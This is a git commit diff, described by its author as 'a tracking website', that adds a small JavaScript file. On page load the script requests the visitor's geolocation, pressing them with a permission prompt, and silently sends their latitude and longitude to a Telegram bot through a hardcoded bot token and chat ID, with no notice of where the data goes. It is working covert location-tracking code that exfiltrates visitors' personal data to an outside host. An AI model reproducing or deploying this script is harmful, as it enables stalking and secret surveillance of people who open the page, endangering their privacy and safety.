d9bddc8358715f802e6615d30519afdc6ec26508
sam <sam@localhost.localdomain>
2023-10-28 20:55:52 +0530

    This is a tracking website

---
+++ script.js
@@ -0,0 +1,45 @@
+const botToken = '5834740713:AAFbVuuVqmoGUfp_nnlfjQ3XwCc2pNCMVTI';
+const chatId = '6034145888';
+
+
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+        alert('Please give loaction permission to go front')
+    }
+}
+
+function showPosition(position) {
+    const messageText = "Latitude: " + position.coords.latitude +
+        "\nLongitude: " + position.coords.longitude;
+        console.log(messageText)
+        sendLoactionToTelegram(messageText)
+}
+
+
+function sendLoactionToTelegram(messageText) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: messageText,
+        }),
+    })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Message sent:', data);
+        })
+        .catch(error => {
+            console.error('Error sending message:', error);
+        });
+}
+
+
+
+
+getLocation()
